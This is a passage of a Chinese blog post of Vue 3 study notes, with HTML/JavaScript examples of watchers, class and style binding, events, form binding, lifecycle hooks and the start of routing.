		Vue实例对象.$watch(&quot;被监听的对象(变量名)&quot;,function(新值,旧值)&#123;&#x2F;&#x2F; 参数2表示监听触发后执行的任务，通常定义在匿名函数中
		&#x2F;&#x2F;事件实现
		&#125;);
	&#125;
	3.触发监听
		@click属性：点击后触发
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;watch监听&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;p&gt;统计点击次数:&#123;&#123; count &#125;&#125;&lt;&#x2F;p&gt;
			&lt;!-- 3.触发监听--&gt;
			&lt;button @click&#x3D;&quot;count++&quot;&gt;点我&lt;&#x2F;button&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						count: 0
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			const vm &#x3D; Vue.createApp(app).mount(&quot;#app&quot;); 
			&#x2F;&#x2F; 1.注册监听
			&#x2F;&#x2F;2.指定要注册的监听对象,定义监听触发后执行的任务
			vm.$watch(&quot;count&quot;,function(nval,oval)&#123;&#x2F;&#x2F; 参数1表示新值，参数2表示旧值
				&#x2F;&#x2F; 弹出框
				alert(&quot;计数器的值被改变：&quot; + oval +&quot;改成了：&quot; + nval);
			&#125;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417114235808.png" alt="image-20230417114235808"></p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417114244601.png" alt="image-20230417114244601"></p>
<h1 id="Vue3动态样式绑定"><a href="#Vue3动态样式绑定" class="headerlink" title="Vue3动态样式绑定"></a>Vue3动态样式绑定</h1><h2 id="1-class属性样式绑定"><a href="#1-class属性样式绑定" class="headerlink" title="1 class属性样式绑定"></a>1 class属性样式绑定</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- Vue3动态样式绑定
	使用v-bind动态控制页面中元素样式
 --&gt;
 &lt;!-- class属性样式绑定
	&#123;
		条件为真，则对应的属性值会被渲染，否则不会被渲染
		&lt;div v-bind:class&#x3D;&quot;&#123;&#39;属性值&#39;: 条件&#125;&quot;&gt;&lt;&#x2F;div&gt;
		
		&lt;div class&#x3D;&quot;static&quot; v-bind:class&#x3D;&quot;&#123;&#39;样式属性名1&#39;: 条件1, &#39;样式属性名2&#39;: 条件2...&#125;&quot;&gt;1.多个值来控制&lt;&#x2F;div&gt;
		
		底层会自动读取对象的属性值，由属性值的真假决定是否被渲染 
		&lt;div class&#x3D;&quot;static&quot; :class&#x3D;&quot;样式对象&quot;&gt;2.通过对象的方式绑定样式到元素上&lt;&#x2F;div&gt;
		
		&lt;div class&#x3D;&quot;static&quot; :class&#x3D;&quot;[key1,key2]&quot;&gt;3.通过数组的方式绑定样式到元素上&lt;&#x2F;div&gt;
		
		条件为真，则去key1的值，否则取&#39;&#39;
		&lt;div class&#x3D;&quot;static&quot; :class&#x3D;&quot;[条件1 ? key1 : &#39;&#39;, 条件2 ? key2 : &#39;&#39;]&quot;&gt;4.三目运算符&lt;&#x2F;div&gt;
			
		return&#123;
			&#x2F;&#x2F; 封装css样式对象
			clsObj: &#123;
				&#x2F;&#x2F; 样式属性名：是否显示该样式
			&#125;,
			&#x2F;&#x2F; 数组定义样式
			key1: 样式属性名1
			key2: 样式属性名2
		&#125;
	&#125;
	
--&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;class属性样式绑定&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
		&lt;!-- 样式 --&gt;
		&lt;style&gt;
			.cls&#123;
				width: 100px;
				height: 100px;
				background: red;
			&#125;
			.active&#123;
				border: 1px solid red;
				background: pink;
			&#125;
			.danger&#123;
				color: red;
			&#125;
			.static&#123; &#x2F;&#x2F;默认呈现
				width: 200px;
				height: 200px;
			&#125;
		&lt;&#x2F;style&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- isActive为真则将cls作为class的值，否则class无取值 --&gt;
			&lt;div v-bind:class&#x3D;&quot;&#123;&#39;cls&#39;: iscls&#125;&quot;&gt;单个值来控制&lt;&#x2F;div&gt;
			&lt;div class&#x3D;&quot;static&quot; v-bind:class&#x3D;&quot;&#123;&#39;active&#39;: isActive, &#39;danger&#39;: isDanger&#125;&quot;&gt;多个值来控制&lt;&#x2F;div&gt;
			&lt;!-- 底层会自动读取clsObj对象的属性值，由属性值的真假决定是否被渲染 --&gt;
			&lt;div class&#x3D;&quot;static&quot; :class&#x3D;&quot;clsObj&quot;&gt;通过对象的方式绑定样式到元素上&lt;&#x2F;div&gt;
			&lt;div class&#x3D;&quot;static&quot; :class&#x3D;&quot;[activeCls,dangerCls]&quot;&gt;通过数组的方式绑定样式到元素上&lt;&#x2F;div&gt;
			&lt;div class&#x3D;&quot;static&quot; :class&#x3D;&quot;[isActive ? activeCls : &#39;&#39;, isDanger ? dangerCls : &#39;&#39;]&quot;&gt;三目运算符&lt;&#x2F;div&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						iscls: true ,    &#x2F;&#x2F;用于控制.cls样式是否展示
						
						isActive: true, &#x2F;&#x2F;显示该样式
						isDanger: true ,&#x2F;&#x2F;显示该样式
						
						&#x2F;&#x2F; 封装css样式对象
						clsObj: &#123;
							&#x2F;&#x2F; 样式属性名：是否显示该样式
							&quot;active&quot;: true,
							&quot;danger&quot;: true
						&#125;,
						&#x2F;&#x2F; 数组定义样式
						activeCls: &quot;active&quot;, &#x2F;&#x2F; key:样式属性名
						dangerCls: &quot;danger&quot;
						
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417134237393.png" alt="image-20230417134237393"></p>
<p>都为真时：</p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417150343822.png" alt="image-20230417150343822"></p>
<h2 id="2-style属性样式绑定"><a href="#2-style属性样式绑定" class="headerlink" title="2 style属性样式绑定"></a>2 style属性样式绑定</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--style属性样式绑定 
	1.将style的属性的取值定义在Vue中
	2.将style的属性的值定义成一个对象，然后通过Vue去绑定
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;style属性样式绑定&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- &lt;p style&#x3D;&quot;color:red;fontsize:14px;&quot;&gt;Vue控制CSS内联样式的动态加载&lt;&#x2F;p&gt; --&gt;
			&lt;div :style&#x3D;&quot;&#123;color: activeColor,fontSize: fontSize&#125;&quot;&gt;将style的属性的取值定义在Vue中&lt;&#x2F;div&gt;
			&lt;div :style&#x3D;&quot;styleObj&quot;&gt;将style的属性的值定义成一个对象，然后通过Vue去绑定&lt;&#x2F;div&gt;
			&lt;div :style&#x3D;&quot;eleSize&quot;&gt;通过数组接收&lt;&#x2F;div&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						activeColor: &quot;red&quot;,
						fontSize: &quot;14px&quot;,
						styleObj: &#123;
							&#x2F;&#x2F; CSS样式属性名：属性值
							&#x2F;&#x2F; CSS的短线要用驼峰命名替代,如font-size要写为fontSize
							color: &quot;red&quot;,
							fontSize: &quot;24px&quot;
						&#125;,
						eleSize: &#123;
							width: &quot;200px&quot;,
							height: &quot;200px&quot;,
							border: &quot;1px solid red&quot;
						&#125;
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417155554206.png" alt="image-20230417155554206"></p>
<h2 id="3-组件上使用动态样式"><a href="#3-组件上使用动态样式" class="headerlink" title="3 组件上使用动态样式"></a>3 组件上使用动态样式</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--组件上使用动态样式 
	通过class属性动态的向子组件传递CSS样式
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;组件上使用动态样式&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
		&lt;!-- 定义样式 --&gt;
		&lt;style&gt;
			.cls&#123;
				color: red;
				background: green;
			&#125;
		&lt;&#x2F;style&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;my-component class&#x3D;&quot;cls&quot;&gt;&lt;&#x2F;my-component&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const myComponent &#x3D; &#123;
				&#x2F;&#x2F;props:[&quot;class&quot;] 动态绑定元素的属性取值不能使用props
				&#x2F;&#x2F; $attrs表示元素的所有属性(id、class、title...)
				template: &#39;&lt;h1 :class&#x3D;&quot;$attrs.class&quot;&gt;1.通过class属性动态的向子组件传递CSS样式&lt;&#x2F;h1&gt;&#39;
			&#125;
			
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;,
				&#x2F;&#x2F; 注册局部组件
				components: &#123;
					&quot;my-component&quot;: myComponent
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417165135357.png" alt="image-20230417165135357"></p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417165250592.png" alt="image-20230417165250592"></p>
<h1 id="Vue3事件处理"><a href="#Vue3事件处理" class="headerlink" title="Vue3事件处理"></a>Vue3事件处理</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--事件处理 --&gt;
&lt;!-- v-on指令
	监听页面中的DOM元素的点击事件
	&lt;button v-on:click&#x3D;&quot;方法名称&quot;&gt;&lt;&#x2F;button&gt;
	&lt;button @click&#x3D;&quot;方法名称&quot;&gt;&lt;&#x2F;button&gt; &#x2F;&#x2F;简写
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;v-on指令&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;button @click&#x3D;&quot;myfun()&quot;&gt;点我&lt;&#x2F;button&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						name: &quot;luotao&quot;
					&#125;
				&#125;,
				methods: &#123;
					myfun()&#123;
						alert(&quot;name的值是:&quot; + this.name);
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417171244054.png" alt="image-20230417171244054"></p>
<h1 id="Vue3表单"><a href="#Vue3表单" class="headerlink" title="Vue3表单"></a>Vue3表单</h1><p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230418113821856.png" alt="image-20230418113821856"></p>
<h2 id="1-文本数据-text-的双向绑定"><a href="#1-文本数据-text-的双向绑定" class="headerlink" title="1 文本数据(text)的双向绑定"></a>1 文本数据(text)的双向绑定</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--Vue3表单 
	原理：语法糖。ViewModel监听元素，元素一旦改变就去读取改变的数据并传给Model，实现数据同步。
--&gt;
&lt;!-- 文本数据(text)的双向绑定 
	* input 单文本输入
	* textarea 多行文本输入
--&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;文本数据(text)的双向绑定 &lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;message&quot;&#x2F;&gt;
			&lt;br&gt;
			&lt;p&gt;input中输入的内容是: &#123;&#123; message &#125;&#125;&lt;&#x2F;p&gt;
			&lt;br&gt;
			
			&lt;textarea v-model&#x3D; &quot;msg&quot; placeholder&#x3D;&quot;输入多行内容...&quot;&gt;&lt;&#x2F;textarea&gt;
			&lt;p&gt;textarea中输入的内容是：&#123;&#123; msg &#125;&#125;&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						message: &#39;&#39;,
						msg: &#39;&#39;
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417173845339.png" alt="image-20230417173845339"></p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230417175119362.png" alt="image-20230417175119362"></p>
<h2 id="2-复选框checkbox"><a href="#2-复选框checkbox" class="headerlink" title="2 复选框checkbox"></a>2 复选框checkbox</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--复选框(checkbox) 
	绑定布尔类型
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;复选框checkbox&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;h1&gt;单个复选框，用布尔值绑定勾选状态&lt;&#x2F;h1&gt;
			&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;checked&quot;&#x2F;&gt;勾选我
			
			&lt;h1&gt;多个复选框,绑定value属性值，用数组来接收&lt;&#x2F;h1&gt;
			&lt;input type&#x3D;&quot;checkbox&quot; id&#x3D;&quot;google&quot; value&#x3D;&quot;google&quot; v-model&#x3D;&quot;checkedNames&quot; &#x2F;&gt;谷歌&lt;&#x2F;br&gt;
			&lt;input type&#x3D;&quot;checkbox&quot; id&#x3D;&quot;baidu&quot; value&#x3D;&quot;baidu&quot; v-model&#x3D;&quot;checkedNames&quot; &#x2F;&gt;百度&lt;&#x2F;br&gt;
			&lt;input type&#x3D;&quot;checkbox&quot; id&#x3D;&quot;byte&quot; value&#x3D;&quot;byte&quot; v-model&#x3D;&quot;checkedNames&quot; &#x2F;&gt;字节&lt;&#x2F;br&gt;
			&lt;p&gt;数组输出: &#123;&#123; checkedNames &#125;&#125;&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						checked: false,
						checkedNames: []
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230418101314712.png" alt="image-20230418101314712"></p>
<h2 id="3-单选框radio"><a href="#3-单选框radio" class="headerlink" title="3 单选框radio"></a>3 单选框radio</h2><h2 id="4-下拉列表select"><a href="#4-下拉列表select" class="headerlink" title="4 下拉列表select"></a>4 下拉列表select</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 下拉列表select
	若下拉列表中有value属性，则双向绑定的是value属性的取值，否则绑定的是标签的内容
	multiple指定下拉列表可以同时选择多个元素
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;下拉列表select&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;div&gt;
				&lt;select v-model&#x3D;&quot;sel&quot; multiple&gt;
					&lt;option disabled value&#x3D;&quot;&quot;&gt;请选择...&lt;&#x2F;option&gt;
					&lt;option v-for&#x3D;&quot;opt in opts&quot; :value&#x3D;&quot;opt.value&quot;&gt;&#123;&#123; opt.txt &#125;&#125;&lt;&#x2F;option&gt;
					&lt;option&gt;A选项&lt;&#x2F;option&gt;
					&lt;option&gt;B选项&lt;&#x2F;option&gt;
					&lt;option&gt;C选项&lt;&#x2F;option&gt;
				&lt;&#x2F;select&gt;
				&lt;p&gt;选择的值是：&#123;&#123; sel &#125;&#125;&lt;&#x2F;p&gt;
			&lt;&#x2F;div&gt;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						sel: &quot;&quot; ,&#x2F;&#x2F;存储用户选择的下拉列表项的内容
						opts: [
							&#123;txt: &quot;百度&quot;,value: &quot;baidu&quot;&#125;,
							&#123;txt: &quot;字节&quot;,value: &quot;byte&quot;&#125;,
							&#123;txt: &quot;谷歌&quot;,value: &quot;google&quot;&#125;
						]
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230418113617676.png" alt="image-20230418113617676"></p>
<h1 id="Vue3生命周期钩子函数"><a href="#Vue3生命周期钩子函数" class="headerlink" title="Vue3生命周期钩子函数"></a>Vue3生命周期钩子函数</h1><p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/lifecycle.16e4c08e.png" alt="lifecycle.16e4c08e"></p>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 钩子函数 
	生命周期：vue对象从被创建,数据的更新，挂载到页面的DOM元素，最后Vue对象被回收。
	Vue提供了生命周期中不同阶段有不同的方法对应，这些方法叫钩子函数。
	在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。
--&gt;

&lt;!--
	beforCreate:	在初始化阶段，创建元素之前被调用
	Created:		初始化完成，创建元素完成后被调用
	beforMount:		挂载到DOM之前调用
	mounted:		挂载成功后调用
	beforeUpdate:	在更新元素值之前被调用
	updated:		在更新元素之后被调用
	beforeUnmounted:在销毁对象后被调用
	Unmounted:		在销毁对象后被调用
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;Vue3生命周期钩子函数&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;,
				beforeCreate()&#123;
					alert(&quot;beforCreate被调用&quot;)
				&#125;,
				created()&#123;
					alert(&quot;created被调用&quot;)
				&#125;,
				beforeMount()&#123;
					alert(&quot;beforeMount被调用&quot;)
				&#125;,
				mounted()&#123;
					alert(&quot;mounted被调用&quot;)
				&#125;,
				beforeUpdate()&#123;
					alert(&quot;beforeUpdate被调用&quot;)
				&#125;,
				update()&#123;
					alert(&quot;update被调用&quot;)
				&#125;,
				beforeUnmounte()&#123;
					alert(&quot;beforeUnmounte被调用&quot;)
				&#125;,
				unmounted()&#123;
					alert(&quot;unmounted被调用&quot;)
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="Vue3路由"><a href="#Vue3路由" class="headerlink" title="Vue3路由"></a>Vue3路由</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--Vue3路由 
	单页面开发，将页面中某一个模块抽离出来作为一个组件渲染到页面上。
	安装路由 https:&#x2F;&#x2F;unpkg.com&#x2F;vue-router@4
	1.定义路由组件:封装组件实现作为一个模块
		&#123;
			const 路由组件名 &#x3D; &#123;
				template: 组件实现
			&#125;
		&#125;
	2.声明路由映射: 一个路由包括一个path和一个component,
		&#123;
			const routes &#x3D; [&#x2F;&#x2F;这里使用数组存放2个路由规则，每个元素表示一个路由的映射
				&#123;path: &quot;路由访问地址1&quot;,component: 路由组件1&#125;,
				&#123;path: &quot;路由访问地址2&quot;,component: 路由组件2&#125;
			]
		&#125;
	3.创建路由对象: 路由以对象的方式绑定到Vue对象上
		&#123;
			const router &#x3D; VueRouter.createRouter(&#123;
				&#x2F;&#x2F;3.1 配置路由参数
				history: VueRouter.createWebHashHistory(), &#x2F;&#x2F; 指定路由创建模式
				&#x2F;&#x2F; routes: 路由映射
				&#x2F;&#x2F; 路由数组重名时，可直接简写为routes
			&#125;);
		&#125;
	4.将路由对象绑定到Vue对象
		&#123;
			&#x2F;&#x2F;创建VUe对象
			Vue对象.use(路由对象);
			&#x2F;&#x2F;挂载
		&#125;
